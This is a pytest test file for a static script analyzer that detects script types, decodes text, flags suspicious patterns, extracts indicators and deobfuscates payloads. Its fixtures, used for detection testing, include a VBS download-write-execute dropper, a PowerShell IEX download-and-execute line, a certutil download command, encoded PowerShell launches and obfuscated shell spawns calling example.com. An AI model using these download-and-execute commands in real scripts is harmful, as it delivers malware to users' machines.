"""Static script analyzer: type detection, decoding, combos, IoCs and findings."""

from __future__ import annotations

import base64

import pytest

from analyzers.script import (
    analyze_script_file,
    detect_script_type,
    extract_script_iocs,
    match_script_combos,
    read_script_text,
    script_findings,
)

_LNK_HEADER = b"\x4c\x00\x00\x00\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46"


def _write(tmp_path, name: str, data: bytes) -> str:
    path = tmp_path / name
    path.write_bytes(data)
    return str(path)


# --------------------------------------------------------------------------- #
# detect_script_type
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize(("name", "expected"), [
    ("a.js", "js"),
    ("a.jse", "js"),
    ("b.vbs", "vbs"),
    ("b.vbe", "vbs"),
    ("c.ps1", "ps1"),
    ("c.psm1", "ps1"),
    ("d.hta", "hta"),
    ("e.wsf", "wsf"),
    ("e.wsc", "wsf"),
    ("f.bat", "bat"),
    ("f.cmd", "bat"),
])
def test_detect_script_type_by_extension(tmp_path, name, expected):
    assert detect_script_type(_write(tmp_path, name, b"")) == expected


@pytest.mark.parametrize(("die_info", "expected"), [
    ({"file_type": "JavaScript"}, "js"),
    ({"language": "JScript"}, "js"),
    ({"detected": "VBScript"}, "vbs"),
    ({"language": "PowerShell"}, "ps1"),
    ({"file_type": "HTML Application"}, "hta"),
    ({"detected": "Windows Batch file"}, "bat"),
])
def test_detect_script_type_by_die_hint(tmp_path, die_info, expected):
    path = _write(tmp_path, "sample.bin", b"")
    assert detect_script_type(path, die_info) == expected


@pytest.mark.parametrize(("name", "data", "expected"), [
    ("js_note.txt", b"var x = 1;\nfunction f() { return x; }\n", "js"),
    ("vbs_note", b'Dim sh\nSet sh = CreateObject("WScript.Shell")\n', "vbs"),
    ("ps_note.txt", b"param($x)\n$env:TEMP\nNew-Object Net.WebClient\nInvoke-Expression $x\n", "ps1"),
    ("hta_note", b'<html><head><script language="vbscript">MsgBox 1</script></head></html>', "hta"),
    ("hta_app.txt", b'<html><head><HTA:APPLICATION ID="x"></head></html>', "hta"),
    ("wsf_note", b'<job id="x"><script language="jscript">WScript.Echo(1)</script></job>', "wsf"),
    ("bat_note.txt", b"@echo off\r\necho hello\r\n", "bat"),
])
def test_detect_script_type_by_content_sniff(tmp_path, name, data, expected):
    assert detect_script_type(_write(tmp_path, name, data)) == expected


def test_detect_script_type_lnk_magic(tmp_path):
    assert detect_script_type(_write(tmp_path, "shortcut.lnk", _LNK_HEADER + b"\x00" * 64)) == "lnk"
    # The header magic alone is enough, regardless of the extension.
    assert detect_script_type(_write(tmp_path, "blob.bin", _LNK_HEADER + b"\x00" * 64)) == "lnk"


def test_detect_script_type_lnk_without_magic_is_not_lnk(tmp_path):
    assert detect_script_type(_write(tmp_path, "note.lnk", b"just a plain text file\n")) is None


def test_detect_script_type_binary_guard(tmp_path):
    assert detect_script_type(_write(tmp_path, "evil.js", b"MZ" + b"\x90" * 32)) is None
    assert detect_script_type(_write(tmp_path, "x.vbs", b"\x7fELF" + b"\x00" * 32)) is None


@pytest.mark.parametrize("magic", [
    b"%PDF-1.7",
    b"PK\x03\x04",
    b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1",
    b"\xfe\xed\xfa\xce",
    b"\xfe\xed\xfa\xcf",
    b"\xce\xfa\xed\xfe",
    b"\xcf\xfa\xed\xfe",
    b"\xca\xfe\xba\xbe",
    b"Rar!\x1a\x07",
    b"7z\xbc\xaf\x27\x1c",
    b"\x1f\x8b\x08",
])
def test_detect_script_type_rejects_non_script_magics(tmp_path, magic):
    # Script markers after the magic must not make a container/executable look like a script.
    data = magic + b"var x = 1;\nfunction f() {}\n"
    assert detect_script_type(_write(tmp_path, "evil.js", data)) is None


def test_detect_script_type_magic_beats_die_hint_and_extension(tmp_path):
    path = _write(tmp_path, "evil.ps1", b"%PDF-1.7\npowershell -enc SQBFAFgA\n")
    assert detect_script_type(path, {"language": "PowerShell"}) is None


def test_detect_script_type_binary_garbage_with_markers_is_not_script(tmp_path):
    data = b"\x00\x01var x = 1;\x00function f() {}\x00\xff\xfe\x80"
    assert detect_script_type(_write(tmp_path, "payload", data)) is None


def test_detect_script_type_utf16le_js_without_bom_is_sniffed(tmp_path):
    data = "var x = 1;\r\nfunction f() { return x; }\r\n".encode("utf-16-le")
    assert detect_script_type(_write(tmp_path, "payload", data)) == "js"


def test_detect_script_type_die_hint_requires_word_boundary(tmp_path):
    path = _write(tmp_path, "prose.txt", b"Plain prose about a chtab format note.\n")
    assert detect_script_type(path, {"detected": "chtab format"}) is None


def test_detect_script_type_plain_prose_is_not_a_script(tmp_path):
    assert detect_script_type(_write(tmp_path, "note.txt", b"This is a plain text note about nothing.\n")) is None


def test_detect_script_type_missing_file(tmp_path):
    assert detect_script_type(str(tmp_path / "missing.js")) is None


# --------------------------------------------------------------------------- #
# read_script_text
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize(("data", "expected"), [
    ("merhaba dünya".encode(), "merhaba dünya"),
    ("hello".encode("utf-8-sig"), "hello"),
    (b"\xff\xfe" + "hello".encode("utf-16-le"), "hello"),
    (b"\xfe\xff" + "hello".encode("utf-16-be"), "hello"),
    ("echo hi".encode("utf-16-le"), "echo hi"),
])
def test_read_script_text_decodings(tmp_path, data, expected):
    assert read_script_text(_write(tmp_path, "sample.bin", data)) == expected


def test_read_script_text_invalid_bytes_do_not_raise(tmp_path):
    text = read_script_text(_write(tmp_path, "broken.bin", b"abc\x80\xff\x81"))
    assert isinstance(text, str)


def test_read_script_text_respects_max_bytes(tmp_path):
    assert read_script_text(_write(tmp_path, "sample.txt", b"abcdef"), max_bytes=4) == "abcd"


def test_read_script_text_missing_file_returns_empty(tmp_path):
    assert read_script_text(str(tmp_path / "missing.ps1")) == ""


# --------------------------------------------------------------------------- #
# match_script_combos
# --------------------------------------------------------------------------- #
VBS_DROPPER = (
    'Set http = CreateObject("MSXML2.XMLHTTP")\n'
    'http.Open "GET", "http://example.com/payload", False\n'
    "http.Send\n"
    'Set stream = CreateObject("ADODB.Stream")\n'
    'stream.SaveToFile "update.exe"\n'
    'Set sh = CreateObject("WScript.Shell")\n'
    'sh.Run("update.exe")\n'
)


def test_vbs_download_write_execute_combo():
    assert "Download-Write-Execute" in match_script_combos(VBS_DROPPER)


def test_powershell_download_execute_combo():
    text = "IEX (New-Object Net.WebClient).DownloadString('http://example.com/a')"
    assert "Download-Execute (PowerShell)" in match_script_combos(text)
    assert "Download-Execute (PowerShell)" not in match_script_combos("net.webclient downloadstring only")


def test_iex_requires_word_boundary():
    assert "Download-Execute (PowerShell)" not in match_script_combos("net.webclient downloadstring index")
    assert "Download-Execute (PowerShell)" not in match_script_combos("net.webclient downloadstring xxiexxx")


def test_encoded_powershell_launch_combo():
    assert "Encoded PowerShell Launch" in match_script_combos("powershell -enc SQBFAFgA")
    assert "Encoded PowerShell Launch" in match_script_combos("powershell.exe -EncodedCommand SQBFAFgA")
    assert "Encoded PowerShell Launch" in match_script_combos("powershell -e JABX")


def test_encoding_flag_is_not_an_encoded_command():
    text = 'powershell.exe -NoProfile -Command "Out-File -Encoding utf8 out.txt"'
    assert "Encoded PowerShell Launch" not in match_script_combos(text)


def test_benign_script_matches_no_combo():
    assert match_script_combos('WScript.Echo "hello"\nconsole.log("hi")\n') == []


def test_lolbin_combo():
    assert "LOLBin Download (certutil)" in match_script_combos(
        "certutil -urlcache -split -f http://example.com/a.exe a.exe"
    )


# --------------------------------------------------------------------------- #
# extract_script_iocs
# --------------------------------------------------------------------------- #
def test_extract_iocs_strips_url_trailing_punctuation_and_dedupes():
    text = "fetch http://example.com/a.js); then http://example.com/a.js);"
    assert extract_script_iocs(text)["url"] == ["http://example.com/a.js"]


def test_extract_iocs_ip_filters():
    text = "192.0.2.5 198.51.100.9 127.0.0.1 0.0.0.0 255.255.255.255 1.2.3.4.5"
    assert extract_script_iocs(text)["ip"] == ["192.0.2.5", "198.51.100.9"]


def test_extract_iocs_progids_and_files_are_not_domains():
    text = (
        'CreateObject("WScript.Shell") CreateObject("ADODB.Stream") '
        'CreateObject("Scripting.FileSystemObject") CreateObject("MSXML2.XMLHTTP") '
        "payload.exe evil-domain.top"
    )
    assert extract_script_iocs(text)["domain"] == ["evil-domain.top"]


def test_extract_iocs_domain_inside_url_is_not_duplicated():
    text = "http://example.com/a and example.com and evil-domain.top"
    domains = extract_script_iocs(text)["domain"]
    assert "example.com" not in domains
    assert "evil-domain.top" in domains


def test_extract_iocs_domain_dedupe_uses_exact_url_hostnames():
    # "evil.com" is a raw substring of "notevil.com" but not a hostname of the URL.
    domains = extract_script_iocs("http://notevil.com/x and evil.com")["domain"]
    assert "evil.com" in domains
    assert "notevil.com" not in domains


def test_extract_iocs_ignores_schema_namespaces():
    text = "http://schemas.microsoft.com/x and www.w3.org and evil-domain.top"
    domains = extract_script_iocs(text)["domain"]
    assert "schemas.microsoft.com" not in domains
    assert "www.w3.org" not in domains
    assert "evil-domain.top" in domains


@pytest.mark.parametrize("domain", ["e.app", "t.io", "n.live", "r.link", "i.me", "ab.co"])
def test_extract_iocs_drops_minified_property_access_pseudo_domains(domain):
    # Minified/obfuscated JS property access must not be reported as a bare domain.
    assert extract_script_iocs(f"var x = {domain};")["domain"] == []


def test_extract_iocs_drops_minified_property_access_in_minified_source():
    text = "var a=e.app,b=t.io,c=n.live,d=r.link,f=i.me,g=ab.co,h=evil-domain.top,i=cdn.ab.co;"
    assert extract_script_iocs(text)["domain"] == ["evil-domain.top", "cdn.ab.co"]


@pytest.mark.parametrize("domain", ["evil-domain.top", "cdn.ab.co"])
def test_extract_iocs_keeps_plausible_bare_domains(domain):
    assert extract_script_iocs(f"beacon {domain} now")["domain"] == [domain]


def test_extract_iocs_three_label_domain_needs_two_char_label():
    # 3+ labels relax the label length to 2, but a single character is still rejected.
    domains = extract_script_iocs("cdn.ab.co and a.b.com")["domain"]
    assert domains == ["cdn.ab.co"]


@pytest.mark.parametrize("url", ["http://e.app/x", "http://t.io/x", "http://ab.co/y"])
def test_extract_iocs_short_hosts_in_urls_are_not_filtered(url):
    iocs = extract_script_iocs(url)
    assert iocs["url"] == [url]
    assert iocs["domain"] == []


# --------------------------------------------------------------------------- #
# script_findings / analyze_script_file
# --------------------------------------------------------------------------- #
FINDINGS_TEXT = (
    'Set http = CreateObject("MSXML2.XMLHTTP")\n'
    'Set stream = CreateObject("ADODB.Stream")\n'
    'CreateObject("WScript.Shell").Run("cmd /c calc")\n'
    "http://example.com/a 192.0.2.9 evil-domain.top\n"
)


def test_script_findings_fields_order_and_confidence():
    findings = script_findings(FINDINGS_TEXT, "vbs")
    combos = [f.value for f in findings if f.kind == "combo"]
    assert combos == match_script_combos(FINDINGS_TEXT)
    assert combos == sorted(combos)

    kinds = [f.kind for f in findings]
    assert kinds == ["combo"] * len(combos) + ["url", "ip", "domain"]
    assert [f.value for f in findings if f.kind == "url"] == ["http://example.com/a"]
    assert [f.value for f in findings if f.kind == "ip"] == ["192.0.2.9"]
    assert [f.value for f in findings if f.kind == "domain"] == ["evil-domain.top"]

    expected_confidence = {"combo": 0.8, "url": 0.7, "ip": 0.7, "domain": 0.5}
    for finding in findings:
        assert finding.source == "script"
        assert finding.address == ""
        assert finding.finding_id == ""
        assert finding.verified is True
        assert finding.confidence == expected_confidence[finding.kind]


def test_script_findings_empty_text():
    assert script_findings("", "js") == []


def test_analyze_script_file_lnk_returns_empty(tmp_path):
    path = _write(tmp_path, "shortcut.lnk", _LNK_HEADER + b"\x00" * 64)
    assert analyze_script_file(path, "lnk") == []


def test_analyze_script_file_js(tmp_path):
    path = _write(
        tmp_path,
        "sample.js",
        b"var u = 'http://example.com/a';\nfunction go() { return u; }\n",
    )
    findings = analyze_script_file(path, "js")
    assert any(f.kind == "url" and f.value == "http://example.com/a" for f in findings)
    assert all(f.source == "script" for f in findings)


def test_analyze_script_file_missing_path_returns_empty(tmp_path):
    assert analyze_script_file(str(tmp_path / "missing.js"), "js") == []


# --------------------------------------------------------------------------- #
# Deobfuscation integration
# --------------------------------------------------------------------------- #
def _b64(data: str | bytes) -> str:
    if isinstance(data, str):
        data = data.encode()
    return base64.b64encode(data).decode("ascii")


def _fake_pe() -> bytes:
    return b"MZ" + b"\x90" * 200 + b"This program cannot be run in DOS mode"


def test_deobf_does_not_duplicate_raw_url(tmp_path):
    hidden = _b64("Harmless note. " * 20 + "http://example.com/x")
    text = f'var u = "http://example.com/x";\nvar b = "{hidden}";\n'
    path = _write(tmp_path, "sample.js", text.encode())

    findings = analyze_script_file(path, "js")

    assert any(f.kind == "url" and f.value == "http://example.com/x" for f in findings)
    assert not any(f.kind == "deobf_url" and f.value == "http://example.com/x" for f in findings)


def test_deobf_combo_hidden_behind_charcodes_and_concat(tmp_path):
    text = (
        'Set sh = CreateObject(Chr(87) & Chr(83) & "cript.Shell")\n'
        'sh.Run("cmd /c calc")\n'
    )
    path = _write(tmp_path, "hidden.vbs", text.encode())

    findings = analyze_script_file(path, "vbs")

    combos = [f for f in findings if f.kind == "combo" and f.address.startswith("deobf:")]
    assert combos
    assert combos[0].value == "Script Host Spawn"
    assert combos[0].confidence == 0.8
    assert combos[0].source == "script"


def test_deobf_embedded_pe_becomes_finding(tmp_path):
    text = f'var payload = "{_b64(_fake_pe())}";\n'
    path = _write(tmp_path, "dropper.js", text.encode())

    findings = analyze_script_file(path, "js")

    embedded = [f for f in findings if f.kind == "embedded_pe"]
    assert len(embedded) == 1
    assert embedded[0].value.startswith("sha256=")
    assert " size=" in embedded[0].value
    assert embedded[0].address.startswith("deobf:")
    assert embedded[0].confidence == 0.9


def test_deobf_kill_switch_disables_deobf_findings(tmp_path, monkeypatch):
    monkeypatch.setenv("CROWBAR_SCRIPT_DEOBF", "0")
    text = (
        'var u = "http://example.com/x";\n'
        f'var payload = "{_b64(_fake_pe())}";\n'
        'Set sh = CreateObject(Chr(87) & Chr(83) & "cript.Shell")\n'
    )
    path = _write(tmp_path, "disabled.js", text.encode())

    findings = analyze_script_file(path, "js")

    assert any(f.kind == "url" for f in findings)  # raw analysis still runs
    assert not any(f.kind.startswith("deobf_") or f.kind.startswith("embedded_") for f in findings)
